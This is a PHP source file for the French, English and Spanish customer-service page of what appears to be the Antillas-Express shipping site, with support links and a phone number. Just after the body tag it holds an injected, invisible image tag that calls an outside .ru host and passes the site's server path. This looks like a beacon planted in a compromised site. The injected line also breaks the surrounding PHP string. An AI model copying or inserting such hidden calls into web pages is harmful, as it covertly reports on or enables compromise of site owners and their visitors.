<?php
include('lib/config.php');

echo 
"<html>
	<head>
		<title>Antillas-express - Montreal to Cuba - ".$param['telephone_client']."</title
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table bgcolor='#EFEFEF' width='$Large' cellpadding='12' cellspacing='0' align='$Enligne' border='0' >		
		<tr>
			<td>"
?>

<?if ($_SESSION['langue']=="fr"){?>
		<blockquote> 
              <p><span class="TitleRed"><br>
                Service &agrave; la client&egrave;le</span> </p>
              <p class="normalTextBold">L&#8217;&eacute;quipe du groupe Antillas-Express 
                souhaite que votre exp&eacute;rience de magasinage en ligne avec 
                nous soit des plus agr&eacute;ables. </p>
              <p class="normalTextBold">Si vous éprouvez des difficultés à magasiner sur le site, des 
				  questions relatives à la livraison, ou toutes autres demandes, vous pouvez nous écrire 
				  et définir la source de votre problème en <a href='mailto:<?php echo hexentities($param['email_support']) ?>'>cliquant ici</a>.
              <br><br>
              <p class="normalTextBold">Si vous avez besoin de renseignements 
                :</p>
              <ul>
                <li class="normalText"><a href="aide.php">Aide</a></li>
                <li class="normalText"><a href="confidentialite.php">Confidentialit&eacute; 
                  des renseignements</a></li>
                <li class="normalText"><a href="securite.php">S&eacute;curit&eacute; 
                  des transactions</a></li>
                <li class="normalText"><a href="termes_conditions.php">Termes 
                  et conditions</a></li>
              </ul>
              <p class="normalTextBold">Commentaires et suggestions :</p>
              <blockquote>
                <p class="normalText"><a href="mailto:<?php echo hexentities($param['courriel_client']) ?>">&Eacute;crivez au webmestre</a></p>
              </blockquote>
              <p class="normalTextBold">Contact direct avec nos agents :</p>
<?} else if ($_SESSION['langue']=="en"){?>
				<blockquote> 
              <p><span class="TitleRed"><br>
                Customer service </span></p>
              <p><span class="normalTextBold">The team of Antillas-Express wants 
                your experience of on-line purchase with us to be of your pleasure. 
                </span><span class="normalText"><br>
                <br>
                </span><span class="normalTextBold">If you are experiencing dificulties navigating on 
					 the web site or if you have any delivery related questions or other demands, write to 
					 us and explain the situation by <a href='mailto:<?php echo hexentities($param['email_support']) ?>'>clicking here</a>.
                <br><br>
              <p><span class="normalTextBold">If you need more information on: 
                </span></p>
              <ul>
                <li class="normalText"><a href="aide.php">Help</a></li>
                <li class="normalText"><a href="confidentialite.php">Confidentiality of the information</a></li>
                <li class="normalText"><a href="securite.php">Security of the transactions</a></li>
                <li class="normalText"><a href="termes_conditions.php">Terms and conditions</a></li>
              </ul>

              	<p class="normalTextBold">Comments and suggestions: </p>
            	<p class="normalText"><a href="mailto:<?php echo hexentities($param['courriel_client']) ?>">Write to our internet administrator</a> (webmaster).</p>
               <p class="normalTextBold">Contact one of our agents directly: </p>
<?} else {?>
				<blockquote> 
              <p><span class="TitleRed"><br>
                Servicio a la clientela</span> </p>
              <p class="normalTextBold">El equipo de Antillas-Express desea que 
                vuestra experiencia de compra en l&iacute;nea con nosotros sea 
                de su agrado.</p>
              <p class="normalTextBold">Si ud presenta dificultades para comprar en el sitio, tiene 
				  preguntas relativas a la entrega, u otras interrogantes, ud puede escribirnos y comunicarnos 
				  el origen del problema <a href='mailto:<?php echo hexentities($param['email_support']) ?>'>cliqueando aqui/a>.
                <br><br>
              
              <p class="normalTextBold">Si Usted tiene necesidad de m&aacute;s 
                informaci&oacute;n :</p>
              <ul>
                <li class="normalText"><a href="aide.php">Ayuda</a></li>
                <li class="normalText"><a href="confidentialite.php">Confidencialidad 
                  de la informaci&oacute;n</a></li>
                <li class="normalText"><a href="securite.php">Seguridad de 
                  las transacciones</a></li>
                <li class="normalText"><a href="termes_conditions.php">T&eacute;rminos 
                  y condiciones</a></li>
              </ul>

              <p class="normalTextBold">Comentarios y sugerencias :</p>
              <p class="normalText"><a href="mailto:<?php echo hexentities($param['courriel_client']) ?>">Escr&iacute;bale a nuestro administrador del sitio internet</a> (webmaster).</p>
              <p class="normalTextBold">Contacte directamente uno de nuestros agentes :</p>
<?}?>
              <blockquote>
                <p class=""><?=$txt['form_telephone'];?> : <?=$param['telephone_client'];?></p>
              </blockquote>
            </blockquote>
			</td>
		</tr>
	  	<tr> 
	    	<td>
				<?php include("bas_page.inc"); ?>
			</td>
	  	</tr>
	</table>
<script language='JavaScript1.2'>
	function Rafraichie(){
		window.location.reload();
//			 str = 'service_clientele.php'; 
//			 open(str,'_self','status=no,toolbar=no,menubar=no,location=no,resizable=no' );
	} // Rafraichie
</script>

</body>
</html>